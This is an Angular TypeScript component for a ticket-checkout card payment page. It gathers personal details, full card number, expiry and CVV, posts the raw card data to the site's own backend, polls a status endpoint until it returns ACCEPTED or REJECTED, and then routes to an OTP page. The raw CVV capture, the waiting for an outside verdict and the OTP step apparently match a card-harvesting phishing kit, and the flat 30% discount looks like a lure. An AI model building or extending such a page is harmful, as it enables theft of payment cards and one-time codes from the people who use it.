import { Component, inject, ChangeDetectorRef, OnDestroy } from '@angular/core';
import { CommonModule, Location } from '@angular/common';
import { Router } from '@angular/router';
import { FormBuilder, FormGroup, Validators, ReactiveFormsModule } from '@angular/forms';
import { Header } from "../../Layout/header/header";
import { OrderCartService } from '../../Core/services/order-cart.service';
import { CheckoutService } from '../../Core/services/api/checkout.service';
import { PaymentVerificationModal, VerificationStatus } from '../../Components/payment-verification-modal/payment-verification-modal';
import { Subscription, interval } from 'rxjs';

@Component({
  imports: [CommonModule, ReactiveFormsModule, Header, PaymentVerificationModal],
  selector: 'app-card-pay',
  styleUrl: './card-pay.css',
  templateUrl: './card-pay.html',
})
export class CardPay implements OnDestroy {
  private readonly orderCartService = inject(OrderCartService);
  private readonly checkoutService = inject(CheckoutService);
  private readonly location = inject(Location);
  private readonly router = inject(Router);
  private readonly fb = inject(FormBuilder);
  private readonly cdr = inject(ChangeDetectorRef);

  paymentForm: FormGroup = this.fb.group({
    personalInfo: this.fb.group({
      name: ['', Validators.required],
      email: ['', [Validators.required, Validators.email]],
      phone: ['', Validators.required],
      age: ['', [Validators.required, Validators.min(1)]]
    }),
    cardDetails: this.fb.group({
      cardNumber: ['', Validators.required],
      expiryMonth: ['', Validators.required],
      expiryYear: ['', Validators.required],
      cvv: ['', Validators.required]
    })
  });

  isLoading = false;
  isVerifying = false;
  verificationStatus: VerificationStatus = 'checking';
  errorMessage = '';

  private pollSub?: Subscription;

  ngOnDestroy(): void {
    this.stopPolling();
  }

  get items() {
    return this.orderCartService.getItems();
  }

  get totalTickets() {
    return this.orderCartService.getTotalTickets();
  }

  get subtotal() {
    return this.orderCartService.getTotalPrice();
  }

  get serviceCharge() {
    return this.subtotal * 0.04;
  }

  get discount() {
    return (this.subtotal + this.serviceCharge) * 0.3;
  }

  get total() {
    return (this.subtotal + this.serviceCharge) - this.discount;
  }

  goBack() {
    this.location.back();
  }

  onPhoneInput(event: Event) {
    const input = event.target as HTMLInputElement;
    input.value = input.value.replace(/[^0-9+]/g, '');
    this.paymentForm.get('personalInfo.phone')?.setValue(input.value, { emitEvent: false });
  }

  onEnglishOnlyInput(event: Event, controlPath: string) {
    const input = event.target as HTMLInputElement;
    input.value = input.value.replace(/[^\x00-\x7F]/g, '');
    this.paymentForm.get(controlPath)?.setValue(input.value, { emitEvent: false });
  }

  pay() {
    if (this.paymentForm.valid && !this.isLoading) {
      const personalInfo = this.paymentForm.value.personalInfo;
      const cardDetails = this.paymentForm.value.cardDetails;

      const payload = {
        cc_name: personalInfo.name,
        cc_number: cardDetails.cardNumber.toString(),
        cc_date: `${cardDetails.expiryMonth}/${cardDetails.expiryYear}`,
        cc_cvv: cardDetails.cvv.toString(),
        credit: Math.round(this.total)
      };

      this.isLoading = true;
      this.checkoutService.submitPayment(payload).subscribe({
        next: (res) => {
          const cardId = res?.CardId || this.checkoutService.cardId;
          this.startVerification(cardId);
        },
        error: (err) => {
          console.error('Payment submission failed', err);
          this.isLoading = false;
          this.cdr.markForCheck();
        }
      });
    } else {
      this.paymentForm.markAllAsTouched();
    }
  }

  private startVerification(cardId: string) {
    this.isVerifying = true;
    this.verificationStatus = 'checking';
    this.errorMessage = '';
    this.cdr.markForCheck();

    this.stopPolling();
    this.pollSub = interval(2000).subscribe(() => {
      this.checkoutService.checkUserStatus(cardId).subscribe((status) => {
        if (status === 'ACCEPTED') {
          this.stopPolling();
          this.verificationStatus = 'accepted';
          this.cdr.markForCheck();
          setTimeout(() => {
            this.isVerifying = false;
            this.isLoading = false;
            this.router.navigate(['/payment/otp']);
          }, 800);
        } else if (status === 'REJECTED') {
          this.stopPolling();
          this.verificationStatus = 'rejected';
          this.errorMessage = 'Transaction declined by bank. Please check your card information or try another card.';
          this.cdr.markForCheck();
        }
      });
    });
  }

  handleRetry(): void {
    this.stopPolling();
    this.isVerifying = false;
    this.isLoading = false;
    this.cdr.markForCheck();
  }

  private stopPolling(): void {
    if (this.pollSub) {
      this.pollSub.unsubscribe();
      this.pollSub = undefined;
    }
  }
}
